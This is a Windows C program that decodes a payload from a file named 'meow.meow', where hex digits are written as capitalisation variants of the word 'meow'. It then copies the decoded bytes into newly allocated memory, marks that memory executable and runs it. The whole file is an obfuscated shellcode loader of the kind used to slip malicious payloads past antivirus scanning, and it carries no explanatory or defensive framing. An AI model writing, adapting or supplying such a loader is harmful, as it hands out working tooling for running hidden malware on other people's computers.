#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

int main(int argc, char* argv[]) {
    FILE *fptr;
    fptr = fopen("meow.meow","r");

    char *meowcode;
    fseek(fptr,0,SEEK_END);
    int size = ftell(fptr);

    meowcode = (char *)malloc(size);
    fseek(fptr,0,SEEK_SET);
    fscanf(fptr,"%s", meowcode);

  
    char *shellcode;
    int shellcode_index;
    shellcode = (char *)malloc((int)(size/4 +1));
    for(int i=0;i<size;i+=4){
        char *ptr = meowcode+i;
        shellcode_index = i/4;
        if(!strncmp(ptr,"meow",4)){
            shellcode[shellcode_index] = '0';
        }else if (!strncmp(ptr,"meoW",4)){
            shellcode[shellcode_index] = '1';
        }else if (!strncmp(ptr,"meOw",4)){
            shellcode[shellcode_index] = '2';
        }else if (!strncmp(ptr,"meOW",4)){
            shellcode[shellcode_index] = '3';
        }else if (!strncmp(ptr,"mEow",4)){
            shellcode[shellcode_index] = '4';
        }else if (!strncmp(ptr,"mEoW",4)){
            shellcode[shellcode_index] = '5';
        }else if (!strncmp(ptr,"mEOw",4)){
            shellcode[shellcode_index] = '6';
        }else if (!strncmp(ptr,"mEOW",4)){
            shellcode[shellcode_index] = '7';
        }else if (!strncmp(ptr,"Meow",4)){
            shellcode[shellcode_index] = '8';
        }else if (!strncmp(ptr,"MeoW",4)){
            shellcode[shellcode_index] = '9';
        }else if (!strncmp(ptr,"MeOw",4)){
            shellcode[shellcode_index] = 'a';
        }else if (!strncmp(ptr,"MeOW",4)){
            shellcode[shellcode_index] = 'b';
        }else if (!strncmp(ptr,"MEow",4)){
            shellcode[shellcode_index] = 'c';
        }else if (!strncmp(ptr,"MEoW",4)){
            shellcode[shellcode_index] = 'd';
        }else if (!strncmp(ptr,"MEOw",4)){
            shellcode[shellcode_index] = 'e';
        }else if (!strncmp(ptr,"MEOW",4)){
            shellcode[shellcode_index] = 'f';
        }
    }
    shellcode[shellcode_index+1] = 0;

    unsigned int char_in_hex;
    unsigned int iterations = strlen(shellcode);
    unsigned int memory_allocation = strlen(shellcode) / 2;
    VirtualProtect(shellcode, memory_allocation, PAGE_READWRITE, 0);
    for (unsigned int i = 0; i < iterations / 2; i++) {
        sscanf(shellcode + 2 * i, "%2X", &char_in_hex);
        shellcode[i] = (char)char_in_hex;
    }


    void* exec = VirtualAlloc(0, memory_allocation, MEM_COMMIT, PAGE_READWRITE);
    memcpy(exec, shellcode, memory_allocation);
    DWORD ignore;
    VirtualProtect(exec, memory_allocation, PAGE_EXECUTE, &ignore);

    (*(void (*)()) exec)();
    return 0;
}
